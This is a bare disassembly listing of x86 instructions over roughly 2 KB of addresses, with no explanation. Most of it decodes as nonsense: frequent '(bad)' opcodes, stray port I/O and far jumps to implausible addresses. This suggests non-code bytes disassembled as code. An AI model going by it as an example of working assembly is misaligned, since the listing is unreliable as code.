  410a1f:	fist   DWORD PTR [edx]
  410a21:	ror    ebp,0xac
  410a24:	loope  0x4109f7
  410a26:	leave  
  410a27:	lock xlat BYTE PTR ds:[ebx]
  410a29:	call   0xd7f1d803
  410a2e:	mov    ecx,0xf2fcf6f1
  410a33:	mov    esp,0xd8f8debf
  410a38:	jmp    0xdd1f0d18
  410a3d:	iret   
  410a3e:	dec    DWORD PTR ds:0xa9c6ddeb
  410a44:	fnstsw WORD PTR [ebp-0x18171f4c]
  410a4a:	in     eax,0xd5
  410a4c:	mov    al,0xc4
  410a4e:	(bad)  
  410a4f:	jmp    0xe1e7:0x2e202dc
  410a56:	xlat   BYTE PTR ds:[ebx]
  410a57:	add    esi,ebp
  410a59:	leave  
  410a5a:	or     ah,bh
  410a5c:	or     ah,al
  410a5e:	jmp    0xcd34d643
  410a63:	(bad)  
  410a64:	jmp    0xbad8:0xb4b2cdf3
  410a6b:	int3   
  410a6c:	into   
  410a6d:	div    BYTE PTR [esi-0x4340fc10]
  410a73:	sar    edx,0x3
  410a76:	idiv   DWORD PTR [ecx+0x4dce9f5]
  410a7c:	(bad)  
  410a7e:	in     eax,dx
  410a7f:	in     eax,0xd3
  410a81:	into   
  410a82:	jmp    0x410a6f
  410a84:	div    bl
  410a86:	scas   al,BYTE PTR es:[edi]
  410a87:	mov    cl,0xe5
  410a89:	retf   0xf3d8
  410a8c:	into   
  410a8d:	fstp   TBYTE PTR [edx-0x423e2d21]
  410a93:	mov    edi,0xf2fcf8fc
  410a98:	out    0xc7,eax
  410a9a:	(bad)  
  410a9c:	enter  0xc2ec,0xda
  410aa0:	add    cl,dh
  410aa2:	shr    edi,0xeb
  410aa5:	jmp    0xc1fd028c
  410aaa:	stc    
  410aab:	fxch   st(5)
  410aad:	clc    
  410aae:	leave  
  410aaf:	jmp    0x410ab3
  410ab1:	cmc    
  410ab2:	enter  0xbebc,0xd9
  410ab6:	loopne 0x410ab8
  410ab8:	repnz add al,0xc4
  410abb:	xlat   BYTE PTR ds:[ebx]
  410abc:	in     al,0xe8
  410abe:	loope  0x410acd
  410ac0:	or     ah,ah
  410ac2:	fsub   st,st(4)
  410ac4:	rcl    ch,0xea
  410ac7:	loopne 0x410aaa
  410ac9:	(bad)  
  410acb:	mov    bh,0xeb
  410acd:	sti    
  410ace:	icebp  
  410acf:	mov    cl,0xc3
  410ad1:	mov    bh,0xfe
  410ad3:	add    eax,esi
  410ad5:	div    ah
  410ad7:	mov    ecx,0xe4eaebbc
  410adc:	out    dx,al
  410add:	ffree  st(5)
  410adf:	or     eax,0xc3bed313
  410ae4:	fsubp  st(6),st
  410ae6:	retf   
  410ae7:	mov    dl,0xf5
  410ae9:	loopne 0x410ae3
  410aeb:	fmul   st,st(7)
  410aed:	mov    esi,0xe902f4bd
  410af2:	fcomi  st,st(0)
  410af4:	mov    DWORD PTR [esi],0x905dffe
  410afa:	loopne 0x410b04
  410afc:	jmp    0x410afd
  410afe:	add    al,0x7
  410b00:	adc    dl,cl
  410b02:	in     eax,dx
  410b03:	mov    bh,0xd5
  410b05:	retf   
  410b06:	retf   
  410b07:	out    0xe7,al
  410b09:	test   edx,0xbdf0b6d7
  410b0f:	(bad)  
  410b11:	cld    
  410b12:	mul    bh
  410b14:	cli    
  410b15:	fcmovu st,st(1)
  410b17:	in     eax,0xf5
  410b19:	cmc    
  410b1a:	(bad)  
  410b1c:	sti    
  410b1d:	fucomip st,st(2)
  410b1f:	ficom  DWORD PTR [ebx]
  410b21:	lods   eax,DWORD PTR ds:[esi]
  410b22:	(bad)  
  410b24:	in     eax,0xc2
  410b26:	(bad)  
  410b27:	(bad)  
  410b29:	(bad)  
  410b2a:	out    dx,eax
  410b2b:	cli    
  410b2c:	retf   0xbef7
  410b2f:	ret    
  410b30:	aam    0xf7
  410b32:	loope  0x410b26
  410b34:	xabort 0xe2
  410b37:	jmp    0xe8d6:0xd4d4e003
  410b3e:	(bad)  
  410b40:	(bad)  
  410b42:	int    0xcb
  410b44:	mul    dl
  410b46:	(bad)  
  410b47:	repz mov edx,0xecb7fab3
  410b4d:	lock mov esp,0xbce0e8dd
  410b53:	hlt    
  410b54:	neg    bl
  410b56:	jecxz  0x410b1d
  410b58:	jmp    0x410b2b
  410b5a:	std    
  410b5b:	iret   
  410b5c:	iret   
  410b5d:	clc    
  410b5e:	add    ecx,edx
  410b60:	dec    cl
  410b62:	repz ret 
  410b64:	retf   0xd3b2
  410b67:	test   eax,0xfbd7ccb4
  410b6c:	mov    bh,0xbe
  410b6e:	add    ecx,ebx
  410b70:	hlt    
  410b71:	jmp    0xe828d871
  410b76:	aam    0xfb
  410b78:	fucomp st(1)
  410b7a:	inc    dh
  410b7c:	fadd   st(4),st
  410b7e:	pop    es
  410b7f:	jmp    ebx
  410b81:	fadd   st,st(0)
  410b83:	in     eax,dx
  410b84:	jmp    0x410b77
  410b86:	scas   al,BYTE PTR es:[edi]
  410b87:	ret    
  410b88:	iret   
  410b89:	int3   
  410b8a:	jmp    0xc2fc:0xdaeffae9
  410b91:	cld    
  410b92:	fmulp  st(6),st
  410b94:	(bad)  
  410b95:	mov    ebp,0xeb0af904
  410b9a:	add    edi,ecx
  410b9c:	push   cs
  410b9d:	into   
  410b9e:	(bad)
  410ba2:	enter  0xa4af,0xe4
  410ba6:	scas   al,BYTE PTR es:[edi]
  410ba7:	in     eax,dx
  410ba8:	icebp  
  410ba9:	mov    cl,0xf1
  410bab:	out    0xe8,eax
  410bad:	(bad)  
  410baf:	cld    
  410bb0:	repnz mov bh,0xee
  410bb3:	icebp  
  410bb4:	clc    
  410bb5:	(bad)  
  410bb6:	fiadd  DWORD PTR [edx]
  410bb8:	or     ah,ah
  410bba:	aam    0xff
  410bbc:	fimul  DWORD PTR [edx+ebx*8]
  410bbf:	dec    DWORD PTR [eax]
  410bc1:	shl    cl,1
  410bc3:	test   al,0xe8
  410bc5:	in     eax,dx
  410bc6:	int    0xce
  410bc8:	sar    ecx,cl
  410bca:	repnz in al,0xe6
  410bcd:	(bad)  
  410bce:	out    dx,al
  410bcf:	out    dx,eax
  410bd0:	iret   
  410bd1:	leave  
  410bd2:	fmulp  st(7),st
  410bd4:	add    eax,0x5d2c7dd
  410bd9:	in     al,0xe9
  410bdb:	(bad)  
  410bdc:	jmp    0x410be8
  410bde:	adc    ebp,ecx
  410be0:	int    0xaf
  410be2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410be3:	mov    edi,0xebbcc2c6
  410be8:	in     eax,dx
  410be9:	fcomp  st(3)
  410beb:	mov    eax,0xd0fdf9c8
  410bf0:	mov    ecx,0xdcdbfcbf
  410bf5:	add    eax,esp
  410bf7:	retf   
  410bf8:	add    eax,0xed09f6eb
  410bfd:	call   0xd91ad011
  410c02:	mov    esp,0xece3e3e1
  410c07:	fcmovbe st,st(0)
  410c09:	neg    bl
  410c0b:	shl    ah,cl
  410c0d:	mul    esp
  410c0f:	in     eax,dx
  410c10:	fcomi  st,st(7)
  410c12:	lock cld 
  410c14:	rol    DWORD PTR [edx],1
  410c16:	add    eax,0xe0c2db04
  410c1b:	in     eax,0xf
  410c1d:	hlt    
  410c1e:	fcmove st,st(0)
  410c20:	fdivr  QWORD PTR [ebp-0xa3b3135]
  410c26:	sti    
  410c27:	lods   eax,DWORD PTR ds:[esi]
  410c28:	in     al,dx
  410c29:	leave  
  410c2a:	iret   
  410c2b:	aad    0xe6
  410c2d:	jmp    0xe231d52b
  410c32:	add    cl,al
  410c34:	out    0xd3,eax
  410c36:	idiv   BYTE PTR [ecx+0xff602c3]
  410c3c:	(bad)  
  410c3d:	or     cl,ah
  410c3f:	jmp    0xcf23cf55
  410c44:	scas   al,BYTE PTR es:[edi]
  410c45:	repz loope 0x410c3e
  410c48:	test   al,0xd7
  410c4a:	(bad)  
  410c4b:	call   0xe41cf12e
  410c50:	out    dx,al
  410c51:	mov    ebp,0xd9dedc
  410c56:	aad    0xe4
  410c58:	shl    edi,1
  410c5a:	add    ecx,ebp
  410c5c:	out    dx,eax
  410c5d:	fstp   st(1)
  410c5f:	cli    
  410c60:	adc    eax,ebx
  410c62:	mov    cl,0xac
  410c64:	scas   eax,DWORD PTR es:[edi]
  410c65:	(bad)  
  410c66:	mov    dh,0xb5
  410c68:	mov    bh,0xcd
  410c6a:	retf   0xc8b6
  410c6d:	lds    edi,FWORD PTR [eax-0x2824fe17]
  410c73:	add    edi,DWORD PTR [esp+eax*1-0x3af8042c]
  410c7a:	in     al,0x0
  410c7c:	clc    
  410c7d:	in     al,0xcc
  410c7f:	leave  
  410c80:	jmp    0xd70edb62
  410c85:	jmp    0xbc3ae874
  410c8a:	out    dx,al
  410c8b:	cmc    
  410c8c:	fxch   st(6)
  410c8e:	int    0xfa
  410c90:	out    dx,al
  410c91:	icebp  
  410c92:	stc    
  410c93:	(bad)  
  410c95:	in     al,dx
  410c96:	ret    0xc0fb
  410c99:	lock jmp 0x410c67
  410c9c:	push   es
  410c9d:	in     al,0xe1
  410c9f:	fcmovu st,st(7)
  410ca1:	fadd   st,st(1)
  410ca3:	leave  
  410ca4:	out    0xee,al
  410ca6:	div    BYTE PTR [edi-0x142e4c18]
  410cac:	mov    bh,0xb3
  410cae:	mov    ebx,0x1edbcc8
  410cb3:	(bad)  
  410cb4:	sti    
  410cb5:	repnz fld st(0)
  410cb8:	pop    es
  410cb9:	(bad)  
  410cba:	jecxz  0x410cc1
  410cbc:	add    ah,dl
  410cbe:	or     ebp,ebp
  410cc0:	add    al,dl
  410cc2:	retf   0xb0ef
  410cc5:	into   
  410cc6:	in     al,0xee
  410cc8:	jmp    0xf4f6e19c
  410ccd:	cld    
  410cce:	out    dx,al
  410ccf:	mov    ebx,0xe1e0b7f7
  410cd4:	int    0xf9
  410cd6:	fcomp  st(7)
  410cd8:	faddp  st(4),st
  410cda:	clc    
  410cdb:	out    0xf8,eax
  410cdd:	(bad)  
  410cde:	jecxz  0x410ced
  410ce0:	jmp    0xd437f6cc
  410ce5:	cmc    
  410ce6:	out    dx,eax
  410ce7:	(bad)  
  410ce8:	fchs   
  410cea:	mov    eax,0xfed6cdea
  410cef:	fdivr  DWORD PTR [edx-0x190e2705]
  410cf5:	ret    
  410cf6:	add    dl,bh
  410cf8:	jecxz  0x410cce
  410cfa:	dec    dl
  410cfc:	fimul  WORD PTR [edx]
  410cfe:	repz repnz retf 
  410d01:	fucomp st(3)
  410d03:	fst    st(2)
  410d05:	scas   eax,DWORD PTR es:[edi]
  410d06:	fcomi  st,st(5)
  410d08:	repnz aad 0xd3
  410d0b:	cmc    
  410d0c:	leave  
  410d0d:	mov    edx,0xffbdefbe
  410d12:	cld    
  410d13:	(bad)  
  410d14:	(bad)  
  410d15:	(bad)  
  410d17:	add    eax,0xfce1c2df
  410d1c:	clc    
  410d1d:	add    eax,edx
  410d1f:	loop   0x410ced
  410d21:	loop   0x410cfb
  410d23:	test   eax,0xebb3eec5
  410d28:	(bad)  
  410d29:	call   0xb93ae5e7
  410d2e:	fdivp  st(0),st
  410d30:	int3   
  410d31:	mov    edi,0xf2d1ffbe
  410d36:	add    ah,al
  410d38:	aad    0xda
  410d3a:	(bad)  
  410d3b:	jmp    0x410d24
  410d3d:	or     ebp,ebx
  410d3f:	retf   0xe7d2
  410d42:	enter  0xc5d3,0xca
  410d46:	jecxz  0x410cf9
  410d48:	(bad)  
  410d49:	mov    ebx,0xb5b0ceb4
  410d4e:	call   0xcd04c93f
  410d53:	(bad)  
  410d55:	aam    0xe5
  410d57:	ror    dl,1
  410d59:	or     eax,esi
  410d5b:	fucomp st(7)
  410d5d:	push   es
  410d5e:	(bad)  
  410d60:	retf   
  410d61:	fadd   st,st(3)
  410d63:	iret   
  410d64:	rcl    ebp,cl
  410d66:	rcr    edx,0xa8
  410d69:	jmp    0xc8db:0xf6e4f2c8
  410d70:	fst    st(6)
  410d72:	mov    edx,0xf7d0f0cc
  410d77:	test   esi,0xe9d4da06
  410d7d:	add    al,0xd4
  410d7f:	or     eax,0xd2d3c8dd
  410d84:	shr    ch,1
  410d86:	shl    DWORD PTR [eax-0x3310321c],1
  410d8c:	(bad)  
  410d8d:	lock retf 0xfadc
  410d91:	rcl    al,cl
  410d93:	in     al,dx
  410d94:	aad    0xf6
  410d96:	clc    
  410d97:	add    eax,0xbdc80ae4
  410d9c:	add    al,BYTE PTR [ebx]
  410d9e:	(bad)  
  410d9f:	out    0xec,eax
  410da1:	out    0xe9,al
  410da3:	(bad)
  410da6:	jmp    0xec0fc97f
  410dab:	shl    esi,cl
  410dad:	aam    0xb2
  410daf:	sti    
  410db0:	lock into 
  410db2:	std    
  410db3:	(bad)  
  410db4:	int    0xc7
  410db6:	repz mov ebp,0xe0e0e405
  410dbc:	(bad)  
  410dbe:	out    0xc1,al
  410dc0:	clc    
  410dc1:	mov    eax,0xc1d0efe8
  410dc6:	loopne 0x410d92
  410dc8:	out    dx,eax
  410dc9:	retf   0xb4ed
  410dcc:	fst    st(1)
  410dce:	retf   0xfdcf
  410dd1:	ret    0xfcdc
  410dd4:	(bad)  
  410dd5:	fld    DWORD PTR [ebx]
  410dd7:	rol    eax,0xb
  410dda:	(bad)  
  410ddc:	or     eax,DWORD PTR [eax]
  410dde:	int3   
  410ddf:	push   es
  410de0:	ror    ch,cl
  410de2:	call   0xe931f694
  410de7:	repz mov al,0xd7
  410dea:	shl    edi,1
  410dec:	int3   
  410ded:	jmp    0xe7ef:0xbafcfff1
  410df4:	loop   0x410dd1
  410df6:	in     eax,0xb9
  410df8:	dec    DWORD PTR [edx]
  410dfa:	enter  0xe203,0xf
  410dfe:	jmp    0x410e13
  410e00:	out    0xbf,al
  410e02:	loope  0x410df4
  410e04:	int    0xc3
  410e06:	in     eax,0xe6
  410e08:	(bad)  
  410e0a:	(bad)
  410e0d:	aad    0xcb
  410e0f:	mov    cl,0xba
  410e11:	imul   al
  410e13:	clc    
  410e14:	jecxz  0x410de6
  410e16:	loopne 0x410e0d
  410e18:	les    eax,FWORD PTR [eax]
  410e1a:	add    ebp,ecx
  410e1c:	enter  0xc501,0xe
  410e20:	add    DWORD PTR [eax-0x101a0f14],edi
  410e26:	(bad)
  410e29:	lock mov ch,0xea
  410e2c:	iret   
  410e2d:	call   eax
  410e2f:	jmp    0x410e06
  410e31:	mov    esi,0xedd0fe01
  410e36:	sti    
  410e37:	out    0xf2,al
  410e39:	fucomp st(0)
  410e3b:	cli    
  410e3c:	cld    
  410e3d:	out    dx,al
  410e3e:	cld    
  410e3f:	add    dl,BYTE PTR [ecx]
  410e41:	out    dx,eax
  410e42:	repnz retf 
  410e44:	in     al,dx
  410e45:	retf   
  410e46:	lock jmp 0xbfba:0xd8d1b6eb
  410e4e:	(bad)  
  410e4f:	jmp    0xd71aff1c
  410e54:	int3   
  410e55:	repz mov esp,0xf0fadfc4
  410e5b:	(bad)  
  410e5c:	(bad)  
  410e5d:	lds    ecx,FWORD PTR [ebx+edx*1]
  410e60:	out    0xe1,eax
  410e62:	mov    al,0xdc
  410e64:	shl    bl,1
  410e66:	aad    0xc7
  410e68:	bnd call 0xe026ed3e
  410e6e:	mov    ebx,0xe1d6f0c8
  410e73:	fld    DWORD PTR [ecx]
  410e75:	std    
  410e76:	loop   0x410e51
  410e78:	icebp  
  410e79:	leave  
  410e7a:	aam    0xf4
  410e7c:	or     eax,0xffcf02de
  410e81:	shl    DWORD PTR [eax-0x3c3a1452],cl
  410e87:	(bad)  
  410e88:	in     al,0xe6
  410e8a:	retf   0xc4d5
  410e8d:	iret   
  410e8e:	std    
  410e8f:	div    eax
  410e91:	add    dl,dh
  410e93:	shr    ebp,1
  410e95:	in     eax,0xc1
  410e97:	jmp    edi
  410e99:	add    edi,ebp
  410e9b:	add    eax,0xc4cfc70a
  410ea0:	jecxz  0x410e61
  410ea2:	rol    edi,cl
  410ea4:	mov    bh,0xe4
  410ea6:	stos   BYTE PTR es:[edi],al
  410ea7:	ror    dh,0xca
  410eaa:	mov    al,0xf1
  410eac:	mov    ebx,0xbeefd3e5
  410eb1:	test   DWORD PTR [edi],0xb04cc06
  410eb7:	or     eax,DWORD PTR ds:0xe009c1d8
  410ebd:	in     eax,dx
  410ebe:	or     al,0xb
  410ec0:	jecxz  0x410e81
  410ec2:	leave  
  410ec3:	leave  
  410ec4:	mov    esi,0xcbc6e0d1
  410ec9:	shl    DWORD PTR [edx+edi*8-0x10490f4c],cl
  410ed0:	iret   
  410ed1:	leave  
  410ed2:	call   0x22000a5
  410ed7:	add    BYTE PTR [eax-0xa171615],bh
  410edd:	jmp    0x410eda
  410edf:	jmp    0x410ef3
  410ee1:	enter  0xcda8,0xf3
  410ee5:	int3   
  410ee6:	shr    ah,1
  410ee8:	shl    bl,cl
  410eea:	in     eax,dx
  410eeb:	call   0xf913d3c3
  410ef0:	mov    ebx,0x7dcf7e2
  410ef5:	push   es
  410ef6:	mov    esi,0xfbc30bd2
  410efb:	(bad)  
  410efc:	push   cs
  410efd:	push   cs
  410efe:	in     eax,0xa
  410f00:	out    dx,al
  410f01:	lods   eax,DWORD PTR ds:[esi]
  410f02:	shl    ch,1
  410f04:	mov    bl,0xcc
  410f06:	int    0xdb
  410f08:	mov    ah,0xcf
  410f0a:	mov    ecx,0xfff7d2f2
  410f0f:	mov    esp,0xcce1faf8
  410f14:	aad    0xe5
  410f16:	(bad)  
  410f18:	cld    
  410f19:	icebp  
  410f1a:	loop   0x410ee6
  410f1c:	out    dx,eax
  410f1d:	inc    BYTE PTR [edi]
  410f1f:	cli    
  410f20:	out    dx,al
  410f21:	into   
  410f22:	lods   eax,DWORD PTR ds:[esi]
  410f23:	rcl    edi,cl
  410f25:	rol    ah,1
  410f27:	in     al,0xf7
  410f29:	out    dx,al
  410f2a:	in     eax,dx
  410f2b:	(bad)
  410f2f:	out    dx,al
  410f30:	ret    0xf9f1
  410f33:	fstp   st(1)
  410f35:	repnz stc 
  410f37:	loope  0x410f0f
  410f39:	fcmovbe st,st(6)
  410f3b:	fiadd  WORD PTR ds:0xccdacce3
  410f41:	mov    esp,0xd7dce7e2
  410f47:	mov    bh,0xd1
  410f49:	mov    dh,0xdf
  410f4b:	(bad)  
  410f4c:	retf   0xb5f5
  410f4f:	mov    ch,0xfb
  410f51:	int3   
  410f52:	mov    esp,0xbdc6ccfb
  410f57:	xlat   BYTE PTR ds:[ebx]
  410f58:	sar    dl,0xf5
  410f5b:	cmc    
  410f5c:	inc    bh
  410f5e:	hlt    
  410f5f:	clc    
  410f60:	in     al,0xc6
  410f62:	les    ebp,FWORD PTR [eax-0x2a1e4a2b]
  410f68:	out    dx,al
  410f69:	mov    dl,0xff
  410f6b:	mov    dh,0xf7
  410f6d:	xlat   BYTE PTR ds:[ebx]
  410f6e:	fsubr  st,st(7)
  410f70:	aam    0xd7
  410f72:	ret    
  410f73:	add    dh,bh
  410f75:	push   es
  410f76:	add    al,0xe2
  410f78:	ret    
  410f79:	loopne 0x410f53
  410f7b:	loop   0x410f7c
  410f7d:	add    DWORD PTR [esi],ecx
  410f7f:	fyl2x  
  410f81:	lods   eax,DWORD PTR ds:[esi]
  410f82:	retf   
  410f83:	in     eax,0xc2
  410f85:	aad    0xc5
  410f87:	mov    bl,0xd1
  410f89:	mov    dl,0xb5
  410f8b:	repnz in al,dx
  410f8d:	out    dx,al
  410f8e:	lock add edi,ecx
  410f91:	(bad)  
  410f93:	hlt    
  410f94:	loop   0x410f8c
  410f96:	inc    BYTE PTR [edi]
  410f98:	add    eax,0xebefcb01
  410f9d:	out    dx,al
  410f9e:	clc    
  410f9f:	fadd   QWORD PTR [ebx]
  410fa1:	ret    0xf0f7
  410fa4:	jmp    0xbb30c686
  410fa9:	clc    
  410faa:	iret   
  410fab:	shr    BYTE PTR [esp+eiz*8-0x361e2b1c],1
  410fb2:	mov    ecx,0xbae306dc
  410fb7:	les    eax,FWORD PTR ds:0xde01dfd0
  410fbd:	in     al,dx
  410fbe:	out    0xf,al
  410fc0:	jecxz  0x410f93
  410fc2:	mov    esp,0xe7c2e5bd
  410fc7:	retf   0xd6eb
  410fca:	jmp    0xc3ec:0xf5b5f2fa
  410fd1:	repz cld 
  410fd3:	mov    esp,0xf3c1f1c2
  410fd8:	jmp    0xe30814a8
  410fdd:	fsubp  st(2),st
  410fdf:	add    al,BYTE PTR [edx]
  410fe1:	in     eax,0xac
  410fe3:	int3   
  410fe4:	jmp    0xc7d3:0xccd4adc1
  410feb:	retf   0xf7d4
  410fee:	in     eax,dx
  410fef:	clc    
  410ff0:	aad    0xcc
  410ff2:	pop    es
  410ff3:	into   
  410ff4:	push   es
  410ff5:	cli    
  410ff6:	stc    
  410ff7:	xlat   BYTE PTR ds:[ebx]
  410ff8:	rol    BYTE PTR [edi+eax*8],cl
  410ffb:	clc    
  410ffc:	fsubp  st(6),st
  410ffe:	sti    
  410fff:	in     al,dx
  411000:	adc    cl,ch
  411002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411003:	out    0xb1,eax
  411005:	out    dx,al
  411006:	shr    eax,1
  411008:	leave  
  411009:	leave  
  41100a:	enter  0xcff7,0xca
  41100e:	int3   
  41100f:	repnz mov esi,0xbcd6bdc2
  411015:	lds    eax,FWORD PTR [edi]
  411017:	xlat   BYTE PTR ds:[ebx]
  411018:	fstp   st(0)
  41101a:	test   cl,0xda
  41101d:	add    ecx,DWORD PTR [ecx]
  41101f:	add    eax,0xefc4c1c0
  411024:	out    0xc4,eax
  411026:	loopne 0x410fff
  411028:	loope  0x410ff4
  41102a:	cmc    
  41102b:	out    0xac,al
  41102d:	call   0xc303db35
  411032:	iret   
  411033:	add    esi,ecx
  411035:	icebp  
  411036:	add    eax,ebx
  411038:	fisttp DWORD PTR [ecx]
  41103a:	cmc    
  41103b:	(bad)
  41103e:	retf   0xe20d
  411041:	scas   eax,DWORD PTR es:[edi]
  411042:	out    dx,al
  411043:	call   0xd1f1f639
  411048:	(bad)
  41104b:	mov    edi,0xf7d9c8dd
  411050:	fucom  st(3)
  411052:	mov    dh,0xf3
  411054:	mov    ah,0xfe
  411056:	std    
  411057:	mov    esp,0xc50bc7fc
  41105c:	(bad)  
  41105e:	or     BYTE PTR [ecx],al
  411060:	loop   0x41104e
  411062:	loope  0x411016
  411064:	jmp    0xead7:0xf5d7b0eb
  41106b:	retf   
  41106c:	fxch   st(0)
  41106e:	mov    esi,0xfbeff2f6
  411073:	into   
  411074:	cli    
  411075:	faddp  st(4),st
  411077:	fld    st(6)
  411079:	add    cl,bl
  41107b:	iret   
  41107c:	std    
  41107d:	(bad)  
  41107f:	in     eax,dx
  411080:	add    al,0xc6
  411082:	(bad)
  411085:	rol    dh,1
  411087:	loop   0x41105c
  411089:	fcmovne st,st(2)
  41108b:	hlt    
  41108c:	into   
  41108d:	idiv   DWORD PTR [edx-0x420d4616]
  411093:	repnz fld st(6)
  411096:	(bad)  
  411098:	shl    dh,1
  41109a:	add    eax,0xe009fad9
  41109f:	enter  0xd3e1,0xd7
  4110a3:	out    0xd1,eax
  4110a5:	in     eax,dx
  4110a6:	scas   al,BYTE PTR es:[edi]
  4110a7:	out    dx,al
  4110a8:	les    esi,FWORD PTR [esi-0x34274a40]
  4110ae:	mov    ch,0xdf
  4110b0:	sti    
  4110b1:	test   DWORD PTR [ecx],0xd1bbdcf9
  4110b7:	pop    es
  4110b8:	test   eax,0xbfcd5c0
  4110be:	(bad)  
  4110c0:	cli    
  4110c1:	ret    
  4110c2:	(bad)  
  4110c4:	leave  
  4110c5:	int3   
  4110c6:	stos   BYTE PTR es:[edi],al
  4110c7:	ret    
  4110c8:	in     al,dx
  4110c9:	mov    ch,0xf6
  4110cb:	(bad)  
  4110cc:	les    edi,FWORD PTR [ebp-0x2212b16]
  4110d2:	jecxz  0x4110c7
  4110d4:	jmp    esp
  4110d6:	div    esp
  4110d8:	hlt    
  4110d9:	aam    0x2
  4110db:	fcmovnu st,st(1)
  4110dd:	(bad)  
  4110de:	loopne 0x4110d2
  4110e0:	ud1    eax,edx
  4110e3:	loope  0x4110ca
  4110e5:	jmp    0x4110de
  4110e7:	cmc    
  4110e8:	sti    
  4110e9:	in     al,0xd3
  4110eb:	sti    
  4110ec:	mov    ch,0xc9
  4110ee:	mov    ecx,0xc8e1d5f0
  4110f3:	mov    esp,0xc2ccd3fd
  4110f8:	loop   0x4110ea
  4110fa:	fimul  WORD PTR [edx]
  4110fc:	push   cs
  4110fd:	add    bl,cl
  4110ff:	or     ebp,esi
  411101:	(bad)
  411105:	mov    ch,0xd6
  411107:	aad    0xf7
  411109:	shl    bh,0xde
  41110c:	mov    dh,0xf8
  41110e:	fstp   st(5)
  411110:	mov    ebx,0xdabcced2
  411115:	in     eax,dx
  411116:	loop   0x4110ed
  411118:	(bad)  
  411119:	shr    ecx,1
  41111b:	xlat   BYTE PTR ds:[ebx]
  41111c:	in     eax,dx
  41111d:	add    al,0x5
  41111f:	fxch   st(3)
  411121:	(bad)  
  411123:	(bad)  
  411125:	cmc    
  411126:	mov    esp,0xe8f2f2b1
  41112b:	(bad)  
  41112c:	(bad)  
  41112d:	idiv   BYTE PTR [ebx-0x3137fc27]
  411133:	(bad)  
  411134:	idiv   edi
  411136:	(bad)  
  411137:	vpsadbw xmm5,xmm0,xmm7
  41113b:	(bad)  
  41113d:	push   es
  41113e:	push   cs
  41113f:	(bad)  
  411141:	in     al,0xeb
  411143:	out    0xec,eax
  411145:	shr    cl,1
  411147:	mov    dl,0xed
  411149:	loope  0x411101
  41114b:	xlat   BYTE PTR ds:[ebx]
  41114c:	(bad)  
  41114d:	in     al,dx
  41114e:	out    dx,eax
  41114f:	out    dx,eax
  411150:	std    
  411151:	(bad)  
  411153:	rol    DWORD PTR [eax],0xdd
  411156:	stc    
  411157:	shl    al,cl
  411159:	add    eax,0xeaeadc0a
  41115e:	pop    es
  41115f:	add    al,0x5
  411161:	out    0xca,al
  411163:	out    0xd2,al
  411165:	mov    cl,0xf0
  411167:	mov    cl,0xd7
  411169:	jmp    0x411139
  41116b:	mov    ecx,0xf0d3eff1
  411170:	mov    eax,0xd7b8f6e8
  411175:	repz shl bl,cl
  411178:	fimul  DWORD PTR [ecx]
  41117a:	(bad)  
  41117b:	or     esi,esi
  41117d:	(bad)  
  41117f:	clc    
  411180:	loope  0x411152
  411182:	shl    ch,1
  411184:	retf   0xd5e9
  411187:	in     al,0xc4
  411189:	in     al,dx
  41118a:	out    dx,al
  41118b:	mov    cl,0xce
  41118d:	shl    ebx,1
  41118f:	mov    edx,0x3bec8c2
  411194:	fcmovne st,st(5)
  411196:	rcl    edi,0x4
  411199:	jmp    0x41119e
  41119b:	loop   0x411184
  41119d:	(bad)
  4111a0:	in     al,0xe9
  4111a2:	jecxz  0x411151
  4111a4:	div    al
  4111a6:	stos   BYTE PTR es:[edi],al
  4111a7:	neg    dl
  4111a9:	into   
  4111aa:	loopne 0x411164
  4111ac:	mov    ch,0xd8
  4111ae:	in     eax,dx
  4111af:	icebp  
  4111b0:	stc    
  4111b1:	int    0xe8
  4111b3:	add    eax,esi
  4111b5:	xlat   BYTE PTR ds:[ebx]
  4111b6:	inc    DWORD PTR [eax]
  4111b8:	add    eax,0xcbe709ff
  4111bd:	mov    ebp,0xc3e5e3ca
  4111c3:	fadd   st(6),st
  4111c5:	retf   
  4111c6:	aad    0xc9
  4111c8:	mov    bl,0xb3
  4111ca:	mov    ebx,0xeeddeab9
  4111cf:	into   
  4111d0:	enter  0xf4d9,0xed
  4111d4:	fnstcw WORD PTR [ebp-0x1bf82505]
  4111da:	ffree  st(0)
  4111dc:	out    0xee,eax
  4111de:	jmp    0xc5ae:0xe5ed05f3
  4111e5:	stos   DWORD PTR es:[edi],eax
  4111e6:	lods   eax,DWORD PTR ds:[esi]
  4111e7:	shl    al,cl
  4111e9:	iret   
  4111ea:	out    dx,eax
  4111eb:	hlt    
  4111ec:	lods   al,BYTE PTR ds:[esi]
  4111ed:	mov    ah,0xc4
  4111ef:	retf   
  4111f0:	add    ebx,eax
  4111f2:	in     eax,dx
  4111f3:	sti    
  4111f4:	fsubrp st(5),st
  4111f6:	jecxz  0x4111fc
  4111f8:	bnd jmp 0xc517d7f3
  4111fe:	pop    es
  4111ff:	repnz adc ah,al
  411202:	mov    esi,0xc9f5ebb3
  411207:	in     eax,0xdb
  411209:	mov    dh,0xd9
  41120b:	int3   
  41120c:	jmp    0xe2ec:0xe3cccef3
  411213:	mov    ch,0xbd
  411215:	loop   0x411202
  411217:	std    
  411218:	aad    0xd8
  41121a:	loope  0x4111e0
  41121c:	iret   
  41121d:	aad    0x5
  41121f:	out    dx,eax
  411220:	enter  0xd2e6,0xb1
  411224:	scas   al,BYTE PTR es:[edi]
  411225:	in     al,dx
  411226:	in     al,0xdb
  411228:	stc    
  411229:	out    dx,eax
  41122a:	mov    dl,0xdb
  41122c:	fcmovnbe st,st(3)
  41122e:	into   
  41122f:	jmp    0xc202e0ef
  411234:	ret    
  411235:	mov    ebx,0xd6d7e7e0
  41123a:	loopne 0x411237
  41123c:	(bad)  
  41123d:	hlt    
  41123e:	add    ecx,eax
  411240:	adc    eax,ebp
  411242:	loop   0x41123b
  411244:	jmp    0xd7ee:0xc7effbce
  41124b:	mov    eax,0xe2e3f7cb
  411250:	call   0xe012d555
  411255:	lock jmp 0x41121c
  411258:	fadd   DWORD PTR [esi]
  41125a:	add    bl,bl
  41125c:	jmp    0x411253
  41125e:	(bad)  
  41125f:	or     eax,0xe1ede7e1
  411264:	test   ebx,0xeff7d0cc
  41126a:	lds    esi,FWORD PTR [eax-0x4a29140b]
  411270:	std    
  411271:	shr    esi,cl
  411273:	in     al,dx
  411274:	mov    esp,0xc6fadebb
  411279:	fmul   DWORD PTR [ebx]
  41127b:	push   cs
